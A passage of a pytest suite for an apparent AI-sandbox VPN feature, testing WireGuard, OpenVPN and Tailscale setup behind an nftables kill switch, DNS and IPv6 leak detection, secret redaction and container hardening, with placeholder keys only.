    commands = [c for c, _ in runner.commands]
    # The kill switch is in place before the tunnel exists; the endpoint was looked up once, before both.
    assert commands.index(["nft", "-f", "-"]) < commands.index(["ip", "link", "add", "dev", "wg0", "type", "wireguard"])
    assert lookups == [("vpn.example.org", 4)]
    killswitch = dict((tuple(c), d) for c, d in runner.commands)[("nft", "-f", "-")]
    assert "meta mark 0xca6c ip daddr 198.51.100.7 udp dport 51820 accept" in killswitch
    # Bypass: endpoint re-resolution. The tunnel gets the address resolved once, never the name.
    setconf = dict((tuple(c), d) for c, d in runner.commands)[("wg", "setconf", "wg0", "/dev/stdin")]
    assert "Endpoint = 198.51.100.7:51820" in setconf and "vpn.example.org" not in setconf
    assert f"PrivateKey = {PRIVATE}" in setconf and f"PresharedKey = {PRESHARED}" in setconf
    assert "FwMark = 0xca6c" in setconf and "PersistentKeepalive = 15" in setconf
    # Keys only ever on standard input, never as an argument.
    assert not any(PRIVATE in " ".join(c) or PRESHARED in " ".join(c) for c in commands)
    assert tunnel["implementation"] == ("kernel" if kernel else "wireguard-go")
    assert (["wireguard-go", "--foreground", "wg0"] in commands) != kernel
    assert tunnel["full4"] and tunnel["full6"] and tunnel["endpoints"] == ["198.51.100.7:51820"]
    assert tunnel["dns"] == ["10.66.0.1", "fd00:66::1"]


def test_wg_setconf_defaults_the_keepalive_for_peers_with_an_endpoint():
    wireguard, _, _ = v.parse_wireguard(WIREGUARD.replace("PersistentKeepalive = 15\n", ""))
    text = rt.wg_setconf(wireguard, PRIVATE, {}, {"0": ("2001:db8::7", 51820)})
    assert "Endpoint = [2001:db8::7]:51820" in text and "PersistentKeepalive = 25" in text
    assert "PresharedKey" not in text


# --- Tailscale ------------------------------------------------------------------------------------------------------

def test_tailscale_up_takes_the_auth_key_from_a_file():
    command = rt.tailscale_up_command({"hostname": "sandbox-ai-ts", "exit_node": "exit-1",
                                       "login_server": "https://hs.example"}, "/run/tailscale/s.sock",
                                      Path("/run/vpn/authkey"))
    assert "--auth-key=file:/run/vpn/authkey" in command and "--exit-node=exit-1" in command
    assert "--exit-node-allow-lan-access=false" in command and "--netfilter-mode=off" in command
    assert "--login-server=https://hs.example" in command and "--accept-dns=false" in command


def test_tailscale_status():
    running = {"BackendState": "Running", "Self": {"TailscaleIPs": ["100.101.1.2", "fd7a:115c:a1e0::1"]},
               "ExitNodeStatus": {"Online": True, "TailscaleIPs": ["100.64.9.9/32"]}}
    facts, problems = rt.tailscale_status(running, "exit-1")
    assert problems == [] and facts["ipv4"] and facts["ipv6"] and facts["exit_node"] == ["100.64.9.9/32"]
    _, problems = rt.tailscale_status({**running, "ExitNodeStatus": {"Online": False}}, "exit-1")
    assert problems == ["the exit node exit-1 is not active"]
    _, problems = rt.tailscale_status({"BackendState": "NeedsLogin", "Self": {}})
    assert problems == ["tailscale is NeedsLogin", "the node has no tailnet address"]


# --- DNS and the address echo ----------------------------------------------------------------------------------------

def dns_reply(query, answers, flags=0x8180):
    """A reply to QUERY with ANSWERS [(type, rdata)], the owner names compressed to the question."""
    ident = query[:2]
    question = query[12:]
    records = b"".join(b"\xc0\x0c" + struct.pack("!HHIH", rtype, 1, 60, len(rdata)) + rdata for rtype, rdata in answers)
    return ident + struct.pack("!HHHHH", flags, 1, len(answers), 0, 0) + question + records


class FakeResolver:
    """A DNS server on 127.0.0.1 (UDP, and TCP for truncated answers)."""

    def __init__(self, answers, truncate=False, stray_first=False):
        self.udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.udp.bind(("127.0.0.1", 0))
        self.port = self.udp.getsockname()[1]
        self.tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.tcp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.tcp.bind(("127.0.0.1", self.port))
        self.tcp.listen(1)
        self.answers, self.truncate, self.stray_first, self.queries = answers, truncate, stray_first, []
        threading.Thread(target=self.serve_udp, daemon=True).start()
        threading.Thread(target=self.serve_tcp, daemon=True).start()

    def serve_udp(self):
        while True:
            query, peer = self.udp.recvfrom(4096)
            self.queries.append(query)
            if self.stray_first:
                self.udp.sendto(b"\x00\x00" + dns_reply(query, [])[2:], peer)  # a reply to some other query
            self.udp.sendto(dns_reply(query, [] if self.truncate else self.answers,
                                      0x8380 if self.truncate else 0x8180), peer)

    def serve_tcp(self):
        connection, _ = self.tcp.accept()
        length = struct.unpack("!H", connection.recv(2))[0]
        reply = dns_reply(connection.recv(length), self.answers)
        connection.sendall(struct.pack("!H", len(reply)) + reply)
        connection.close()


@pytest.mark.parametrize("mode", ["udp", "tcp", "stray"])
def test_dns_client_follows_the_resolvers_answer(mode):
    cname = b"\x03cdn\x07example\x00"
    server = FakeResolver([(5, cname), (1, bytes([203, 0, 113, 9])), (28, ipaddress.IPv6Address("2001:db8::9").packed)],
                          truncate=mode == "tcp", stray_first=mode == "stray")
    assert rt.dns_lookup("api.example.org", "127.0.0.1", 1, port=server.port) == ["203.0.113.9"]
    if mode == "udp":
        assert rt.dns_lookup("api.example.org", "127.0.0.1", 28, port=server.port) == ["2001:db8::9"]
        query = server.queries[0]
        assert query[12:].startswith(b"\x03api\x07example\x03org\x00") and query[2:4] == b"\x01\x00"


def test_dns_answers_refuse_garbage_and_accept_nxdomain():
    query = rt.dns_query_packet("x.example", 1, 4242)
    assert rt.dns_answers(dns_reply(query, [], flags=0x8183), 4242, 1) == []
    with pytest.raises(ValueError, match="not a reply"):
        rt.dns_answers(dns_reply(query, []), 4243, 1)
    with pytest.raises(ValueError, match="DNS error code 2"):
        rt.dns_answers(dns_reply(query, [], flags=0x8182), 4242, 1)
    with pytest.raises(ValueError, match="truncated"):
        rt.dns_answers(dns_reply(query, [(1, b"\x01\x02\x03\x04")])[:-2], 4242, 1)
    with pytest.raises(ValueError, match="invalid name"):
        rt.encode_name("a" * 64 + ".example")


def test_resolver_keeps_literal_addresses_and_tries_the_next_server():
    calls = []

    def lookup(name, server, qtype):
        calls.append(server)
        if server == "10.64.0.1":
            raise TimeoutError("no answer")
        return ["203.0.113.4"]
    resolve = rt.resolver_for(["10.64.0.1", "10.64.0.2"], lookup)
    assert resolve("198.51.100.7", 4) == ["198.51.100.7"] and resolve("198.51.100.7", 6) == []
    assert resolve("api.example.org", 4) == ["203.0.113.4"] and calls == ["10.64.0.1", "10.64.0.2"]


def test_echo_parses_json_plain_text_and_mullvads_flag():
    assert rt.parse_echo(b'{"ip":"185.65.134.10","country":"Sweden","mullvad_exit_ip":true}') == ("185.65.134.10", True)
    assert rt.parse_echo(b"2001:db8::5\n") == ("2001:db8::5", None)
    assert rt.parse_echo(b'{"IP": "203.0.113.5", "ISP": "x"}') == ("203.0.113.5", None)
    with pytest.raises(ValueError):
        rt.parse_echo(b"<html>blocked</html>")


def test_echo_tells_blocked_from_missing_and_failed():
    def resolve(name, family):
        return {"v4only.example": {4: ["203.0.113.1"], 6: []}, "both.example": {4: ["203.0.113.2"], 6: ["2001:db8::2"]}}[
            name][family]

    def refused(url, address, timeout):
        raise PermissionError(errno.EPERM, "Operation not permitted")
    urls = ["https://v4only.example/", "https://both.example/"]
    assert rt.echo(urls, 6, resolve, refused)["kind"] == "blocked"
    assert rt.echo(["https://v4only.example/"], 6, resolve, refused)["kind"] == "no-address"
    answered = rt.echo(urls, 4, resolve, lambda u, a, t: (200, b'{"ip": "185.65.134.10"}'))
    assert answered == {"ip": "185.65.134.10", "vpn": None, "url": "https://v4only.example/"}
    assert rt.echo(urls, 4, resolve, lambda u, a, t: (502, b""))["kind"] == "failed"
    assert "answered with" in rt.echo(urls, 6, resolve, lambda u, a, t: (200, b"203.0.113.9"))["error"]


def test_fetch_pins_the_address_and_checks_the_certificate_for_the_name(api):
    api.routes[("GET", "/json")] = (200, {"ip": "185.65.134.10"})
    status, body = rt.fetch(f"https://localhost:{api.server.server_address[1]}/json", "127.0.0.1",
                            context=api.client_context)
    assert status == 200 and json.loads(body) == {"ip": "185.65.134.10"}
    with pytest.raises(ssl.SSLError):
        rt.fetch(f"https://other.example:{api.server.server_address[1]}/json", "127.0.0.1",
                 context=api.client_context)


# --- the verdict -----------------------------------------------------------------------------------------------------

PROFILE = {"name": "corp", "type": "wireguard", "provider": "mullvad", "dns": ["10.64.0.1"],
           "wireguard": {"addresses": ["10.68.1.2/32"], "peers": []}}
HOST = {"ipv4": "198.18.0.5", "ipv6": "2001:db8:ff::5", "dns_egress": ["198.18.53.53"]}
TUNNEL4 = {"interface": "wg0", "ipv4": True, "ipv6": False, "full4": True, "full6": False}
GOOD_DNS = {"servers": ["10.64.0.1"], "configured": True, "routes": {"10.64.0.1": "wg0"},
            "answers": {"10.64.0.1": True}, "egress": ["185.65.134.200"]}


def inside(ipv4=None, ipv6=None, dns=None):
    return {"ipv4": ipv4 or {"ip": "185.65.134.10", "vpn": True, "url": "https://am.i.mullvad.net/json"},
            "ipv6": ipv6 or {"error": "connection refused", "kind": "blocked"}, "dns": dns or GOOD_DNS}


def test_a_clean_tunnel_passes():
    verdict = v.evaluate(PROFILE, TUNNEL4, inside(), HOST)
    assert verdict["failures"] == [] and verdict["warnings"] == []
    assert "IPv4: 185.65.134.10 seen by am.i.mullvad.net (the provider confirms the VPN)" in verdict["notes"]
    assert "IPv6: blocked (the VPN carries none)" in verdict["notes"]


@pytest.mark.parametrize("case, expected", [
    ({"ipv4": {"ip": "198.18.0.5", "vpn": None, "url": "https://x.example/"}}, "this host's own address 198.18.0.5"),
    ({"ipv4": {"ip": "185.65.134.10", "vpn": False, "url": "https://x.example/"}}, "not one of its VPN exits"),
    ({"ipv4": {"error": "timed out", "kind": "blocked"}}, "IPv4: no connection through the VPN"),
    # The IPv6 leak: the tunnel has no IPv6, yet an IPv6 address answered.
    ({"ipv6": {"ip": "2001:db8:ff::5", "vpn": None, "url": "https://x.example/"}}, "this host's own address 2001"),
    ({"ipv6": {"ip": "2001:db8:aa::1", "vpn": None, "url": "https://x.example/"}}, "although the VPN carries no IPv6"),
    ({"dns": {**GOOD_DNS, "routes": {"10.64.0.1": "eth0"}}}, "reached over eth0, not through the tunnel wg0"),
    ({"dns": {**GOOD_DNS, "answers": {"10.64.0.1": "timed out"}}}, "does not answer through the tunnel"),
    ({"dns": {**GOOD_DNS, "egress": ["198.18.0.5"]}}, "DNS leak"),
])
def test_leaks_are_refused(case, expected):
    verdict = v.evaluate(PROFILE, TUNNEL4, inside(**case), HOST)
    assert any(expected in failure for failure in verdict["failures"]), verdict


def test_what_only_warns():
    no_host = v.evaluate({**PROFILE, "provider": None}, TUNNEL4,
                         inside(ipv4={"ip": "185.65.134.10", "vpn": None, "url": "https://x.example/"}), {})
    assert no_host["failures"] == [] and "could not be compared" in no_host["warnings"][0]
    v6 = v.evaluate(PROFILE, {**TUNNEL4, "ipv6": True, "full6": True}, inside(), HOST)
    assert v6["failures"] == [] and "IPv6: no connection through the VPN" in v6["warnings"][0]
    unconfigured = v.evaluate({**PROFILE, "dns": []}, TUNNEL4, inside(dns={**GOOD_DNS, "configured": False}), HOST)
    assert "names no resolver" in unconfigured["warnings"][0]
    forwarding = v.evaluate(PROFILE, TUNNEL4, inside(dns={**GOOD_DNS, "egress": ["198.18.53.53"]}), HOST)
    assert forwarding["failures"] == [] and "like this host's own resolver" in forwarding["warnings"][0]


def test_split_tunnels_and_the_tailnet():
    split = {**TUNNEL4, "full4": False}
    verdict = v.evaluate(PROFILE, split, inside(ipv4={"error": "refused", "kind": "blocked"}), HOST)
    assert verdict["failures"] == [] and "IPv4: blocked (the echo services lie outside the tunnel)" in verdict["notes"]
    tailnet = {"name": "ts", "type": "tailscale", "tailscale": {"exit_node": None}}
    dns = {"servers": [rt.QUAD100], "configured": True, "routes": {rt.QUAD100: "tailscale0"},
           "answers": {rt.QUAD100: True}}
    verdict = v.evaluate(tailnet, {"interface": "tailscale0"}, {"dns": dns}, {})
    assert verdict == {"failures": [], "warnings": [], "notes": []}


# --- the container -----------------------------------------------------------------------------------------------------

def wireguard_profile(home, name="corp", text=WIREGUARD):
    source = home / f"{name}.conf"
    source.write_text(text)
    v.main(["add", name, "--wireguard", str(source)])
    return v.load_profile(name)


def test_the_container_gets_no_secret_on_its_command_line(home):
    profile = wireguard_profile(home)
    command = v.container_command(["podman"], "agent-x-vpn", profile, pod="agent-x")
    joined = " ".join(command)
    assert PRIVATE not in joined and PRESHARED not in joined and "--env" not in command
    assert command[command.index("--pod") + 1] == "agent-x" and "--network" not in command
    assert "--cap-drop=ALL" in command and "--cap-add=NET_ADMIN" in command and "--cap-add=NET_RAW" not in command
    assert "--device=/dev/net/tun" in command and "--read-only" in command and "--log-driver=none" in command
    assert f"type=bind,src={ROOT / 'sandbox' / 'vpn_runtime.py'},dst=/vpn/vpn_runtime.py,ro" in command
    assert command[-4:] == [v.VPN_IMAGE, "-I", "/vpn/vpn_runtime.py", "serve"]
    data = v.payload(profile, "serve", ["api.example.org"])
    assert data["secrets"] == {"private_key": PRIVATE, "preshared_keys": {"0": PRESHARED}}
    assert PRIVATE not in json.dumps(data["profile"]) and data["resolve"] == ["api.example.org"]
    alone = v.container_command(["podman"], "c", profile, action="check", network="pasta:x")
    assert alone[alone.index("--network") + 1] == "pasta:x" and alone[-1] == "check"


def test_tailscale_state_is_mounted_into_its_container_only(home):
    v.main(["add", "ts", "--tailscale"])
    profile = v.load_profile("ts")
    command = v.container_command(["podman"], "c", profile, pod="p")
    assert f"type=bind,src={v.state_dir('ts') / 'tailscale'},dst=/var/lib/tailscale,rw" in command
    assert "--cap-add=NET_RAW" in command
    ephemeral = {**profile, "tailscale": {**profile["tailscale"], "ephemeral": True}}
    command = v.container_command(["podman"], "c", ephemeral, pod="p")
    assert "--tmpfs=/var/lib/tailscale:rw,nosuid,nodev,mode=0700" in command and "dst=/var/lib/tailscale" not in " ".join(command)
    with v.profile_lock(profile):
        with pytest.raises(ValueError, match="in use by another sandbox"):
            with v.profile_lock(profile):
                pass


FAKE_CONTAINER = r"""
import json, sys
data = json.loads(sys.stdin.readline())
mode = data["profile"]["name"]
def say(**event):
    print(json.dumps(event), flush=True)
say(event="progress", message="bringing up wireguard")
if mode == "broken":
    say(event="error", message="RTNETLINK answers: Operation not permitted")
    sys.exit(1)
if mode == "gone":
    print("Error: localhost/sandbox-ai-vpn:latest: image not known", file=sys.stderr)
    sys.exit(125)
say(event="ready", tunnel={"interface": "wg0"}, checks={}, hosts={},
    got=sorted(data["secrets"]))
sys.stdin.readline()
say(event="closed")
"""


def test_tunnel_protocol(home):
    said = []
    tunnel = v.Tunnel([sys.executable, "-c", FAKE_CONTAINER], {"profile": {"name": "ok"}, "secrets": {"private_key": "k"}},
                      said.append)
    ready = tunnel.wait_ready(timeout=20)
    assert ready["got"] == ["private_key"] and said == ["bringing up wireguard"]
    assert tunnel.process.poll() is None  # the tunnel lives as long as its standard input is open
    tunnel.close()
    assert tunnel.process.returncode == 0
    for name, message in (("broken", "Operation not permitted"), ("gone", "build the image: sandbox-ai build vpn")):
        tunnel = v.Tunnel([sys.executable, "-c", FAKE_CONTAINER], {"profile": {"name": name}, "secrets": {}}, said.append)
        with pytest.raises(ValueError, match=message):
            tunnel.wait_ready(timeout=20)
        tunnel.close()


def test_the_runtime_reports_errors_without_secrets(tmp_path, monkeypatch):
    out = []
    stream = types.SimpleNamespace(write=out.append, flush=lambda: None)
    payload = {"profile": {"type": "wireguard", "wireguard": {"peers": [{"endpoint": {"host": "x", "port": 1}}]}},
               "secrets": {"private_key": PRIVATE}}

    def boom(payload, runner, resolve=None):
        raise RuntimeError(f"wg failed for {PRIVATE}")
    monkeypatch.setattr(rt, "up_wireguard", boom)
    stdin = types.SimpleNamespace(readline=lambda: json.dumps(payload))
    assert rt.main(["check"], stdin, stream) == 1
    events = [json.loads(line) for line in out]
    assert events[-1]["event"] == "error" and PRIVATE not in json.dumps(events) and "[secret]" in events[-1]["message"]
    assert rt.redact("account 1234567890123456 key tskey-auth-kAbC-123") == "account [secret] key [secret]"


# --- the build ------------------------------------------------------------------------------------------------------

def test_build_vpn_image(tmp_path, monkeypatch):
    log = tmp_path / "build.json"
    (tmp_path / "podman").write_text("#!/usr/bin/python3\nimport json,os,sys\nfrom pathlib import Path\n"
                                     "Path(os.environ['BUILD_LOG']).write_text(json.dumps(sys.argv[1:]))\n")
    (tmp_path / "podman").chmod(0o700)
    environment = {**os.environ, "PATH": f"{tmp_path}:/usr/bin:/bin", "BUILD_LOG": str(log)}
    result = subprocess.run([str(ROOT / "sandbox-build-image"), "vpn", "--build-arg", "WIREGUARD_GO_VERSION=v0.0.1"],
                            capture_output=True, text=True, env=environment)
    assert result.returncode == 0, result.stderr
    # Without a systemd user session the build uses cgroupfs (sandbox-build-image); on a desktop login it does not.
    cgroups = [] if os.path.exists(f"/run/user/{os.getuid()}/bus") else ["--cgroup-manager=cgroupfs"]
    assert json.loads(log.read_text()) == [*cgroups, "build", "--pull=newer", "--tag", "localhost/sandbox-ai-vpn:latest", "--label",
                                           "sandbox-ai.role=vpn", "--file", str(ROOT / "sandbox" / "Containerfile.vpn"),
                                           "--build-arg", "WIREGUARD_GO_VERSION=v0.0.1", str(ROOT / "sandbox")]
    log.unlink()
    for options in (["--pin", "1.2.3"], ["--extension-only"]):  # agent image options
        refused = subprocess.run([str(ROOT / "sandbox-build-image"), *options, "vpn"], capture_output=True, text=True,
                                 env=environment)
        assert refused.returncode == 2 and "not vpn" in refused.stderr and not log.exists()
    recipe = (ROOT / "sandbox" / "Containerfile.vpn").read_text()
    for part in ("wireguard-tools", "openvpn", "nftables", "iproute2", "python3", "golang.zx2c4.com/wireguard",
                 "/usr/local/bin/tailscaled"):
        assert part in recipe, part


def test_main_knows_the_vpn_command():
    main = load("sandbox_main_vpn_test", "main.py")
    assert main.PYTHON_COMMANDS["vpn"] == ("vpn.py",) and "sandbox-ai vpn add" in main.__doc__


# --- MCP servers and the policy file ---------------------------------------------------------------------------------

def test_mcp_wrapper_runs_the_bridge_behind_a_checked_tunnel(home, monkeypatch):
    wireguard_profile(home)
    calls, closed = [], []

    class Tunnel:
        def __init__(self, command, data, say):
            calls.append(("container", command))

        def wait_ready(self, timeout=0):
            return {"tunnel": {"interface": "wg0", "ipv4": True, "full4": True}, "hosts": {},
                    "checks": {"ipv4": {"ip": "185.65.134.10", "vpn": None, "url": "https://x.example/"},
                               "dns": {"configured": True, "routes": {"10.66.0.1": "wg0"}, "answers": {"10.66.0.1": True}}}}

        def follow(self, on_event):
            pass

        def close(self):
            closed.append(True)
    monkeypatch.setattr(v, "Tunnel", Tunnel)
    monkeypatch.setattr(v, "host_baseline", lambda settings: {"ipv4": "198.18.0.5"})
    monkeypatch.setattr(v, "podman_run", lambda command, **kw: calls.append(("podman", command))
                        or types.SimpleNamespace(returncode=1, stdout="", stderr=""))
    code = v.mcp_wrapper("corp", "sandbox-ai-vpn-mcp-ddg", "/owner", [sys.executable, "-c", "raise SystemExit(3)"])
    assert code == 3 and closed == [True]
    container = calls[1][1]
    assert container[container.index("--network") + 1] == s.POD_NETWORK
    assert "sandbox-ai.vpn-owner=/owner" in container and PRIVATE not in " ".join(container)
    assert calls[-1][1][1:3] == ["rm", "--force"]
    # A failed check: the bridge never starts.
    monkeypatch.setattr(v, "host_baseline", lambda settings: {"ipv4": "185.65.134.10"})
    with pytest.raises(ValueError, match="checks failed"):
        v.mcp_wrapper("corp", "sandbox-ai-vpn-mcp-ddg", "/owner", [sys.executable, "-c", "raise SystemExit(0)"])
    # A container of that name that is not ours stays.
    monkeypatch.setattr(v, "podman_run", lambda command, **kw: types.SimpleNamespace(
        returncode=0, stdout='{"other": "x"}', stderr=""))
    with pytest.raises(ValueError, match="was not created here"):
        v.mcp_wrapper("corp", "sandbox-ai-vpn-mcp-ddg", "/owner", ["true"])


def test_mcp_image_mounts_never_show_vpn_keys(home):
    wireguard_profile(home)
    mcp = load("sandbox_mcp_vpn_test", "mcp.py")
    with pytest.raises(ValueError, match="where the VPN profiles keep their keys"):
        mcp.check_image_mounts("x", {"image": "x", "mounts": [{"host": str(home / "config"), "target": "/cfg"}]})


def test_policy_file_require_vpn_values(tmp_path, monkeypatch):
    path = tmp_path / "policy.json"
    real_lstat, real_stat = os.lstat, os.stat

    def as_root(function):
        def call(target, *args, **kwargs):
            info = function(target, *args, **kwargs)
            if Path(target) in (path, path.parent):
                values = list(info)
                values[stat.ST_UID], values[stat.ST_MODE] = 0, (info.st_mode & ~0o7777) | 0o644
                return os.stat_result(values)
            return info
        return call
    monkeypatch.setattr(s.os, "lstat", as_root(real_lstat))
    monkeypatch.setattr(s.os, "stat", as_root(real_stat))
    for good in (True, False, ["corp", "home-1"]):
        path.write_text(json.dumps({"version": 1, "require_vpn": good, "forbid": ["--vpn-check=warn"]}))
        assert s.load_policy(path)["require_vpn"] == good
    for bad in ("yes", [], ["../x"], [1]):
        path.write_text(json.dumps({"version": 1, "require_vpn": bad}))
        with pytest.raises(ValueError, match="require_vpn is true, false or a list"):
            s.load_policy(path)


def test_doctor_checks_the_vpn_once_there_is_a_profile(home, tmp_path, monkeypatch):
    doctor = load("sandbox_doctor_vpn_test", "doctor.py")
    assert doctor.check_vpn()[0] == "skip"
    wireguard_profile(home)
    monkeypatch.setattr(doctor.shutil, "which", lambda name: "/usr/bin/" + name)
    monkeypatch.setattr(doctor, "run", lambda command, timeout=30: (1, ""))
    assert doctor.check_vpn()[1:] == ("VPN", f"{v.VPN_IMAGE} missing", "sandbox-ai build vpn")
    monkeypatch.setattr(doctor, "run", lambda command, timeout=30: (0, ""))
    assert doctor.check_vpn(tun=tmp_path / "no-tun")[:3] == ("fail", "VPN", "/dev/net/tun is missing")
    (tmp_path / "tun").touch()
    (tmp_path / "modules").mkdir()
    status, _, detail, _ = doctor.check_vpn(modules=tmp_path / "modules", tun=tmp_path / "tun")
    assert status == "ok" and "as wireguard-go" in detail
    (tmp_path / "modules" / "wireguard").mkdir()
    assert "in the kernel" in doctor.check_vpn(modules=tmp_path / "modules", tun=tmp_path / "tun")[2]


# --- the runtime's other paths --------------------------------------------------------------------------------------

def test_openvpn_comes_up_behind_the_kill_switch(tmp_path, monkeypatch):
    monkeypatch.setattr(rt, "RUN", tmp_path)
    config, info, _, _ = v.parse_openvpn(OPENVPN)

    class Runner(FakeRunner):
        def spawn(self, command, log):
            (tmp_path / "openvpn.json").write_text(json.dumps({"dev": "tun0", "ipv4": "10.8.0.6", "ipv6": "",
                                                                "dns": ["10.8.0.1"]}))
            return super().spawn(command, log)
    runner = Runner()

    def resolve(name, family):
        return {("vpn1.example.org", 4): ["203.0.113.40", "203.0.113.41"], ("vpn1.example.org", 6): ["2001:db8::40"],
                ("198.51.100.9", 4): ["198.51.100.9"]}.get((name, family), [])
    tunnel = rt.up_openvpn({"profile": {"type": "openvpn", "openvpn": {**info, "full": True}},
                            "secrets": {"openvpn_config": config, "openvpn_auth": "alice\ns3cret"}}, runner, resolve)
    commands = [c for c, _ in runner.commands]
    killswitch = runner.commands[0][1]
    assert commands[0] == ["nft", "-f", "-"] and commands.index(["nft", "-f", "-"]) < len(commands) - 1
    for rule in ("ip daddr 203.0.113.40 udp dport 1194", "ip6 daddr 2001:db8::40 udp dport 1194",
                 "ip daddr 198.51.100.9 tcp dport 443"):
        assert f"meta mark 0xca6c {rule} accept" in killswitch
    written = (tmp_path / "client.ovpn").read_text()
    assert "remote 203.0.113.40 1194 udp\n" in written and "remote 198.51.100.9 443 tcp-client\n" in written
    assert "vpn1.example.org" not in written  # resolved once; OpenVPN never looks the name up again
    assert (tmp_path / "auth").read_text() == "alice\ns3cret\n" and stat.S_IMODE((tmp_path / "auth").stat().st_mode) == 0o600
    openvpn = next(c for c in commands if c[0] == "openvpn")
    assert openvpn[openvpn.index("--auth-user-pass") + 1] == str(tmp_path / "auth") and "s3cret" not in " ".join(openvpn)
    assert tunnel["full4"] and not tunnel["ipv6"] and not tunnel["full6"] and tunnel["dns"] == ["10.8.0.1"]
    # No IPv6 address from the server: no IPv6 into the tunnel either.
    assert commands[-1] == ["nft", "insert", "rule", "inet", "sandbox_ai_vpn", "output", "oifname", "tun0", "meta",
                            "nfproto", "ipv6", "drop"]


def test_checks_from_inside_the_namespace(monkeypatch):
    answers = {("api64.ipify.org", 1): ["104.237.62.211"], ("api64.ipify.org", 28): ["2001:db8::211"],
               ("whoami.akamai.net", 1): ["185.65.134.200"]}
    asked = []

    def lookup(name, server, qtype, timeout=4.0, port=53):
        asked.append((name, server))
        return answers.get((name, qtype), [])
    monkeypatch.setattr(rt, "dns_lookup", lookup)

    def get(url, address, timeout):
        if ":" in address:
            raise PermissionError(errno.EPERM, "Operation not permitted")
        return 200, b'{"ip": "185.65.134.10"}'
    url = "https://api64.ipify.org/?format=json"
    result = rt.gather_checks({"checks": {"urls": [url], "dns_probe": "whoami.akamai.net", "timeout": 2}},
                              {"interface": "wg0", "dns": ["10.66.0.1"]}, FakeRunner(), get)
    assert result["ipv4"] == {"ip": "185.65.134.10", "vpn": None, "url": url}
    assert result["ipv6"]["kind"] == "blocked"
    assert result["dns"] == {"servers": ["10.66.0.1"], "configured": True, "routes": {"10.66.0.1": "wg0"},
                             "answers": {"10.66.0.1": True}, "egress": ["185.65.134.200"]}
    # Every lookup went to the VPN's resolver.
    assert {server for _, server in asked} == {"10.66.0.1"}
    # Without a resolver in the profile: the fallback, through the tunnel, and said so.
    assert rt.gather_checks({"checks": {"urls": [url], "ip": False}}, {"interface": "wg0", "dns": []}, FakeRunner(),
                            get)["dns"]["configured"] is False


def test_pinned_names_resolve_through_the_tunnel_in_its_families(monkeypatch):
    families = []
    monkeypatch.setattr(rt, "dns_lookup", lambda name, server, qtype, timeout=4.0, port=53:
                        families.append(qtype) or (["203.0.113.7"] if qtype == 1 else ["2001:db8::7"]))
    assert rt.resolve_hosts(["api.example.org"], {"dns": ["10.66.0.1"], "ipv4": True, "ipv6": False}) == \
        {"api.example.org": ["203.0.113.7"]}
    assert families == [1]  # no IPv6 address where the tunnel carries none
    both = rt.resolve_hosts(["api.example.org"], {"dns": ["10.66.0.1"], "ipv4": True, "ipv6": True})
    assert both == {"api.example.org": ["2001:db8::7", "203.0.113.7"]}
    monkeypatch.setattr(rt, "dns_lookup", lambda *a, **kw: [])
    with pytest.raises(ValueError, match="through the VPN"):
        rt.resolve_hosts(["gone.example.org"], {"dns": ["10.66.0.1"], "ipv4": True})
    # Tailscale without an exit node: MagicDNS first, then the ordinary resolver for names outside the tailnet.
    monkeypatch.setattr(rt, "system_resolver", lambda name, family: ["203.0.113.8"] if family == 4 else [])
    assert rt.resolve_hosts(["pypi.org"], {"dns": [rt.QUAD100]}, mode_tailnet=True) == {"pypi.org": ["203.0.113.8"]}


def test_serve_reports_ready_and_ends_with_its_standard_input(monkeypatch):
    tunnel = {"interface": "wg0", "dns": ["10.66.0.1"], "ipv4": True}
    monkeypatch.setattr(rt, "up_wireguard", lambda payload, runner: tunnel)
    monkeypatch.setattr(rt, "gather_checks", lambda payload, tunnel, runner: {"dns": {}})
    monkeypatch.setattr(rt, "resolve_hosts", lambda names, tunnel, tailnet: {n: ["203.0.113.7"] for n in names})
    read, write = os.pipe()
    os.write(write, json.dumps({"profile": {"type": "wireguard"}, "secrets": {}, "resolve": ["a.example"]}).encode()
             + b"\n")
    os.close(write)
    out = []
    with os.fdopen(read) as stdin:
        assert rt.main(["serve"], stdin, types.SimpleNamespace(write=out.append, flush=lambda: None), FakeRunner()) == 0
    events = [json.loads(line) for line in out]
    assert [e["event"] for e in events] == ["progress", "ready"]
    assert events[1]["hosts"] == {"a.example": ["203.0.113.7"]} and events[1]["tunnel"] == tunnel


@pytest.mark.parametrize("exit_node", [None, "exit-1"])
def test_tailscale_comes_up_with_its_login_url_and_status(exit_node, tmp_path, monkeypatch):
    monkeypatch.setattr(rt, "RUN", tmp_path / "run" / "vpn")
    (tmp_path / "run").mkdir()
    status = {"BackendState": "Running", "Self": {"TailscaleIPs": ["100.101.1.2", "fd7a:115c:a1e0::1"]},
              "ExitNodeStatus": {"Online": True, "TailscaleIPs": ["100.64.9.9/32"]} if exit_node else None}

    class Runner(FakeRunner):
        def spawn(self, command, log):
            (tmp_path / "run" / "tailscale" / "tailscaled.sock").touch()  # tailscaled is listening
            return super().spawn(command, log)

        def stream(self, command):
            self.commands.append((command, None))
            assert (tmp_path / "run" / "vpn" / "authkey").read_text() == "tskey-auth-k1-SECRET"
            script = "print('To authenticate, visit:'); print(); print('\\thttps://login.tailscale.com/a/abc123')"
            return subprocess.Popen([sys.executable, "-c", script], stdout=subprocess.PIPE, text=True)

        def run(self, command, data=None, check=True):
            if command[-2:] == ["status", "--json"]:
                self.commands.append((command, None))
                return types.SimpleNamespace(returncode=0, stdout=json.dumps(status), stderr="")
            return super().run(command, data, check)
    runner, out = Runner(), []
    stream = types.SimpleNamespace(write=out.append, flush=lambda: None)
    tunnel = rt.up_tailscale({"profile": {"type": "tailscale", "tailscale": {
        "hostname": "sandbox-ai-ts", "exit_node": exit_node, "ephemeral": False}},
        "secrets": {"tailscale_auth_key": "tskey-auth-k1-SECRET"}}, runner, out=stream)
    commands = [c for c, _ in runner.commands]
    assert (commands[0] == ["nft", "-f", "-"]) == bool(exit_node)  # an exit node: the kill switch before tailscaled
    tailscaled = next(c for c in commands if c[0] == "tailscaled")
    assert "--tun=tailscale0" in tailscaled and "--state=/var/lib/tailscale/tailscaled.state" in tailscaled
    assert not any("tskey" in " ".join(c) for c in commands)  # the auth key only in its file, gone afterwards
    assert not (tmp_path / "run" / "vpn" / "authkey").exists()
    assert json.loads(out[0]) == {"event": "login", "url": "https://login.tailscale.com/a/abc123"}
    assert tunnel["full4"] == bool(exit_node) and tunnel["dns"] == [rt.QUAD100] and tunnel["ipv6"]
